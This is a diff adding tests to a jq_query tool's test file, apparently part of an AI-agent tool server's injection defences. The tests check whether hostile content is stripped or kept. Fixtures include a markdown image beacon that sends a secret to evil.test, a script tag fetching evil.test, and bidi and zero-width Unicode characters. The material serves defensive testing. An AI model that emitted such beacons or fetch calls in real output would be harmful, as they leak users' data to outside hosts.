@@ -7,6 +7,7 @@ import { mkdtemp, writeFile, rm, symlink, mkdir, stat } from "fs/promises";
 import { tmpdir } from "os";
 import { join, basename } from "path";
 import { executeJqQuery } from "./jq-query.js";
+import { createWrapper } from "../response/post-processor.js";
 import { clearAllowedDirsCache } from "../security/file-validation.js";
 import { clearInjectionDetectionMap } from "../security/detection-logger.js";
 import { ENV } from "../config/index.js";
@@ -308,5 +309,99 @@ describe("executeJqQuery — input boundary errors", () => {
 
         expect(result.isError).toBe(true);
         expect(result.content[0].text).toMatch(/Error querying/i);
+    });
+});
+
+
+// -----------------------------------------------------------------------------
+// jq_query's grammar, and the decision behind it.
+//
+// `docs/todos/001` asked for a beacon inside a saved file to be STRIPPED in the
+// returned text, on the reading that `jq_query` took a shorter defence path than
+// `defendText`. It does not: `applyJqFilter` parses its input as JSON and
+// returns `JSON.stringify(...)`, so this text is a JSON document, and
+// `defendText` on a JSON document IS sanitise-and-detect — the markup and
+// markdown stages are excluded by `isSniffableContentType`, deliberately,
+// because `<script>` and `[a](b)` are legitimate inside JSON string values.
+//
+// So the asymmetry the todo named was not `jq_query`-vs-`curl_execute`; it was
+// JSON-vs-everything, and it holds identically for `curl_execute --jq_filter`
+// on the same bytes. Stripping here would have made this tool the odd one out
+// AND silently rewritten what `save_to_file` persists. Recorded as RC-8; these
+// tests pin the decided behaviour so a later round reads the decision instead
+// of re-opening it.
+// -----------------------------------------------------------------------------
+
+describe("executeJqQuery — JSON grammar (RC-8: markup/markdown stages excluded)", () => {
+    it("returns a markdown beacon inside a JSON string value verbatim", async () => {
+        const file = join(allowedDir, "beacon.json");
+        const beacon = "![x](https://evil.test/?d=secret)";
+        await writeFile(file, JSON.stringify({ note: `see ${beacon}` }), "utf-8");
+
+        const result = await executeJqQuery(
+            { filepath: file, jq_filter: ".note" } as never,
+            {}
+        );
+        expect(result.isError).toBeUndefined();
+        expect(result.content[0].text).toContain(beacon);
+    });
+
+    it("the wrap does not strip it either — the result is marked defended", async () => {
+        // The composition is the claim. `jq_query` ran the pipeline's JSON arm,
+        // so the wrap defers rather than re-deciding the grammar from text
+        // whose content type it can no longer see. Without the tag the wrap's
+        // strictest-grammar arm would rewrite this to `[image removed]`, and
+        // `save_to_file` would have persisted one thing while the model saw
+        // another.
+        const file = join(allowedDir, "beacon2.json");
+        const beacon = "![x](https://evil.test/?d=secret)";
+        await writeFile(file, JSON.stringify({ note: `see ${beacon}` }), "utf-8");
+
+        const result = await executeJqQuery(
+            { filepath: file, jq_filter: ".note" } as never,
+            {}
+        );
+        const wrapped = createWrapper({})(result, "jq");
+        expect(wrapped.content[0].text).toContain(beacon);
+    });
+
+    it("still sanitises Unicode attack characters concentrated by the filter", async () => {
+        // The teeth for the two tests above: they assert that something is NOT
+        // removed, and an implementation that defended nothing at all would
+        // satisfy both. This one fails unless Step 2 actually runs.
+        const file = join(allowedDir, "bidi.json");
+        await writeFile(
+            file,
+            JSON.stringify({ note: "ok\u202Eevil\u200Btext" }),
+            "utf-8"
+        );
+
+        const result = await executeJqQuery(
+            { filepath: file, jq_filter: ".note" } as never,
+            {}
+        );
+        expect(result.content[0].text).not.toContain("\u202E");
+        expect(result.content[0].text).not.toContain("\u200B");
+        expect(result.content[0].text).toContain("okeviltext");
+    });
+
+    it("an ERROR result is NOT marked defended — the wrap defends it in full", async () => {
+        // The error text embeds exception messages, and `applyJqFilter`'s
+        // invalid-JSON error quotes a preview of the file it was reading.
+        // Foreign bytes in a message this process formatted are still foreign
+        // bytes, so the error path keeps the untagged default.
+        const file = join(allowedDir, "notjson.txt");
+        await writeFile(file, "<script>fetch('https://evil.test')</script>", "utf-8");
+
+        const result = await executeJqQuery(
+            { filepath: file, jq_filter: ".note" } as never,
+            {}
+        );
+        expect(result.isError).toBe(true);
+        expect(result.content[0].text).toContain("evil.test");
+
+        const wrapped = createWrapper({})(result, "jq");
+        expect(wrapped.content[0].text).not.toContain("<script");
+        expect(wrapped.content[0].text).not.toContain("evil.test");
     });
 });
